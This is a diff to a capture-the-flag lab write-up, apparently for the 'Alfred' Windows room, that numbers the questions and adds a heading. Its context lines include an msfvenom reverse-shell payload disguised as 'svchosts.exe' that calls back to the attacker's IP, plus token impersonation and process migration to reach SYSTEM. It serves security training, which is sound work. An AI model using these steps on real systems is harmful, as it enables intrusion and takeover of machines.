@@ -4,7 +4,7 @@
 
 ## Task 1: Initial Access
 
-**How many ports are open? (TCP only)**
+**1) How many ports are open? (TCP only)**
 
 As always, we're going to start with an aggressive nmap scan on all ports with very verbose output.
 
@@ -24,7 +24,7 @@ While we wait for the SYN Stealth Scan, let's go checkout the website on port 80
 
 We can gather some information from the site, **alfred@wayneenterprises[.]com**
 
-**What is the username and password for the log in panel(in the format username:password)**
+**2) What is the username and password for the log in panel(in the format username:password)**
 
 From the website, we can assume that a username will be alfred. We also have the domain of the emails which may be needed later. Unfortunately, I see no extra information from the source.
 
@@ -122,7 +122,7 @@ Copyright (C) 2015 Microsoft Corporation. All rights reserved.
 PS C:\Program Files (x86)\Jenkins\workspace\project>systeminfo
 ```
 
-**What is the user.txt flag?**
+**3) What is the user.txt flag?**
 
 Now, we can begin looking for the user.txt flag! Start by checking desktop and documents. Then use type user.txt to read the file in powershell.
 
@@ -134,7 +134,7 @@ Now it's time to try and escalate our privileges. First, lets get an improved sh
 msfvenom -p windows/shell_reverse_tcp LHOST=Tun0-IP LPORT=5555 -e x86/shikata_ga_nai -f exe -o svchosts.exe  
 ```
 
-**What is the final size of the exe payload that you generated?**
+**1) What is the final size of the exe payload that you generated?**
 
 After creating the payload, we will see the final size for our fake service host in the output.
 
@@ -158,11 +158,13 @@ Show options and set the LPORT to 5555, along with the LHOST to the Tun0-IP. Run
 Start-Process "svchosts.exe" 
 ```
 
+## Task 3: Privilege Escalation
+
 Now, check your listener in metasploit and you should see the command shell session opened. Let's go ahead and view privileges with whoami /priv.
 
 Luckily for us, we can see [SeDebugPrivilege, SeImpersonatePrivilege](https://www.exploit-db.com/papers/42556) are both enabled. Exit the cmd session, and use the metasploit incognito module with meterpreter. Then, list the tokens.
 
-**To check which tokens are available, enter the list_tokens -g. We can see that the BUILTIN\Administrators token is available. Use the impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators token. What is the output when you run the getuid command?**
+**1) To check which tokens are available, enter the list_tokens -g. We can see that the BUILTIN\Administrators token is available. Use the impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators token. What is the output when you run the getuid command?**
 
 ```
 load incognito
@@ -183,7 +185,7 @@ We can do this by using ps to find a PID and migrate to it if it is running as S
 migrate services.exePID
 ```
 
-**read the root.txt file at C:\Windows\System32\config**
+**2) read the root.txt file at C:\Windows\System32\config**
 
 Now we can cd to the given directory and use more root.txt to see the flag!
 
